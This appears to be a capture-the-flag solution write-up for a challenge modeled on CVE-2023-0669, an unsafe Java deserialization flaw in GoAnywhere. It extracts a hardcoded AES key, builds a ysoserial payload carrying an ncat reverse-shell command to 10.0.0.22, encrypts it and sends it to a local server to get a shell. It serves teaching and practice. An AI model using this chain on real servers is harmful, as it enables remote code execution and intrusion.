`too-latte` is based almost entirely on [CVE-2023-0669](https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis),
which is an unsafe deserialization vulnerability in Fortra's GoAnywhere MFA
software. I modeled all the vulnerable code off, as much as I could, that
codebase. It's obviously themed quite differently.

If you use a tool like [jadx](https://github.com/skylot/jadx) to unpack the
servlets, you'll find, through some layers of indirection, this code in
TokenWorker.java (that operates on the `token` parameter):

```java
  public static String unbundle(String token, KeyConfig keyConfig) throws Exception {
    token = token.substring(0, token.indexOf("$"));

    return new String(decompress(verify(decrypt(decode(token.getBytes(StandardCharsets.UTF_8)), keyConfig.getVersion()), keyConfig)), StandardCharsets.UTF_8);
  }
```

The `decode` function decodes the `token` parameter from `Base64`.

The `decrypt` function decrypts the token with a static key. The actual decryption
code is under several layers of indirection, because Java is Java, but the
`TokenEncryptor` class has a key, IV, and algorithm:

```java
    private static final byte[] IV = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
    private static final String KEY_ALGORITHM = "AES";
    private static final String CIPHER_ALGORITHM = "AES/CBC/PKCS5Padding";

    // [...]

    // This actually gets a key
    private byte[] getInitializationValue() throws Exception {
      return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("cafelatteTokenP@$$wrd".getBytes(), "UTF-8").toCharArray(), new byte[]{12, 56, 72, 86, 73, 99, 35, 44, 35, 97, 45, 45, 89, 23, 33, 67}, 3392, 256)).getEncoded();
    }
```

Instead of figuring out what to do, we can write our own code to call that
function the way we did in `flat-white-extra-shot`:

```java
import java.lang.reflect.Method;
import java.util.Arrays;

public class GetKey {
  public static void main(String[] args) throws Exception {
    Method method = org.bsidessf.ctf.toolatte.TokenEncryptor.class.getDeclaredMethod("getInitializationValue");
    method.setAccessible(true);
    byte []key = (byte[])method.invoke(null);
    System.out.println(Arrays.toString(key));
  }
}
```

Then compile and execute it, using the included .jar file:

```
$ javac -cp .:./TooLatte.jar GetKey.java
$ java -cp .:./TooLatte.jar GetKey
[-48, 63, 50, 98, -65, -28, -41, -100, -93, -34, -28, -105, -49, -1, 22, -54, 125, -117, -46, 123, -78, -120, -11, 104, -35, -98, 61, 65, -11, -55, 79, -20]
```

Now that we have all the crypto information, we can replicate `decrypt()`! The
next thing on our list of functions is `verify()`:

```java
  private static byte[] verify(byte[] data, KeyConfig keyConfig) throws Exception {
    ObjectInputStream objectInputStream = null;
    PublicKey publicKey = getPublicKey(keyConfig);
    ObjectInputStream objectInputStream2 = new ObjectInputStream(new ByteArrayInputStream(data));

    SignedObject signedObject = (SignedObject) objectInputStream2.readObject();

    if (!signedObject.verify(publicKey, Signature.getInstance("SHA512withRSA"))) {
        throw new IOException("Unable to verify signature! Did you send us a Token Request by mistake?");
    }

    byte[] outData = ((SignedContainer) signedObject.getObject()).getData();
    if (objectInputStream2 != null) {
        objectInputStream2.close();
    }
    return outData;
  }
```

If you're familiar with Java security, there's a huge red flag there -
`ObjectInputStream`! That's a deserialization sink - in other words, if we can
control the data going into it (which we can!), we can run arbitrary commands!

Passing the verification doesn't matter, nor does anything after it. We can now
grab [ysoserial](https://github.com/frohoff/ysoserial), create a payload,
encrypt it, and send it along.

First, let's generate a payload (I've intentionally included the necessary
files for `CommonBeanutils1` to work):

```
$ java -jar ./ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'ncat -e /bin/bash 10.0.0.22 4444' > /tmp/javapayload.ser
```

Then let's use `irb` (interactive Ruby) to encrypt/encode it:

```irb
$ irb
3.1.3 :001 > require 'openssl'
 => true 
3.1.3 :002 > require 'base64'
 => true 
3.1.3 :003 > payload = File.read('/tmp/javapayload.ser')
 => "\xAC\xED\u0000\u0005sr\u0000\u0017java.util.PriorityQueue\x94\xDA0\xB4\xFB?\x82\xB1\u0003\u0000\u0002I\u0000\u0004sizeL\u0000\ncomparatort\u0... 
3.1.3 :004 > cipher = OpenSSL::Cipher.new('AES-256-CBC')
 => #<OpenSSL::Cipher:0x00007fd294a25a58> 
3.1.3 :005 > cipher.encrypt
 => #<OpenSSL::Cipher:0x00007fd294a25a58> 
3.1.3 :006 > cipher.iv = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 => "\u0001\u0002\u0003\u0004\u0005\u0006\a\b\t\n\v\f\r\u000E\u000F\u0010" 
3.1.3 :007 > cipher.key = "\xd0\x3f\x32\x62\xbf\xe4\xd7\x9c\xa3\xde\xe4\x97\xcf\xff\x16\xca\x7d\x8b\xd2\x7b\xb2\x88\xf5\x68\xdd\x9e\x3d\x41\xf5\xc9\x4f\
xec"
 => "\xD0?2b\xBF\xE4ל\xA3\xDE\xE4\x97\xCF\xFF\u0016\xCA}\x8B\xD2{\xB2\x88\xF5hݞ=A\xF5\xC9O\xEC" 
3.1.3 :008 > puts Base64::urlsafe_encode64(cipher.update(payload) + cipher.final()) + "$2"
iRNXnWJjCrdkfbDk2b[......]
```

Then we start our Netcat listener in one window:

```
$ nc -v -l -p 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

And send that payload in another:

```
$ curl 'http://localhost:8080/validate?token=iRNXnWJjCrdkfbDk2b[......]
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
```

And in our first window, we get a shell!

```
$ nc -v -l -p 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.0.22.
Ncat: Connection from 10.0.0.22:37132.
whoami
tomcat
cat /flag.txt
CTF{good-work-you-saved-humanity}
```
